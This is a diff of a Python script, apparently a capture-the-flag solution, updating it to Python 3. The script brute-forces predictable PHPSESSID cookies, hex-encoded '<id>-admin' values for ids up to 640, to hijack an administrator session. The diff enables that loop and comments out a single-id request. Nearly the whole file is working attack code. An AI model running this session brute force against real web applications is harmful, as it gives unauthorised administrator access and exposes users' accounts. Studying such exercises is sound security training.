@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 import requests
@@ -12,30 +12,31 @@ login = (usn, password)
 
 
 
-##uncomment following lines after finding PHPSESSID from for loop
-session = requests.Session()   
-connection = session.get(url, cookies = { "PHPSESSID" : str("%d-admin" % 281).encode('hex')}, auth = login)   
-print connection.text
+##uncomment this block after finding PHPSESSID from the for loop below
+# session = requests.Session()   
+# connection = session.get(url, cookies = { "PHPSESSID" : str("%d-admin" % 281).encode('utf-8').hex()}, auth = login)   
+# print(connection.text)
+##
 
 
 
 
-#for i in range(641):
-    #session = requests.Session()
-   # print {"PHPSESSID" : str("%d-admin" % i).encode('hex')}
+for i in range(641):
+    session = requests.Session()
     #connection = session.post(url, data = { "username" : "tylerptl", "password": "zombocom"}, auth = login)
-    #connection = session.get(url, cookies = {"PHPSESSID" : str("%d-admin" % i).encode('hex')}, auth = login)
+    connection = session.get(url, cookies = {"PHPSESSID" : str("%d-admin" % i).encode('utf-8').hex()}, auth = login)
 
 
 
-    #print session.cookies["PHPSESSID"].decode('hex')   ## works w/post
-    #pageContent = connection.text
+    # print(session.cookies["PHPSESSID"])   ## works w/post - the hex will represent userid-username (i.e 555-sampleName) that was passed in the post
+    pageContent = connection.text
 
 
-
-    #if ("regular"  not in pageContent):
-     #   print "===================="
-     #   print "Admin ID found " , i
-     #   print "===================="
-      #  break
-    #print pageContent
+    # This will filter out regular user responses
+    if ("regular" not in pageContent):
+       print("====================")
+       print("Admin ID found " , i)
+       print("====================")
+       break
+    print("(" + str(i) + ") failed - moving on. ---- ", end="", flush=True)
+    print({"PHPSESSID" : str("%d-admin" % i).encode('utf-8').hex()})
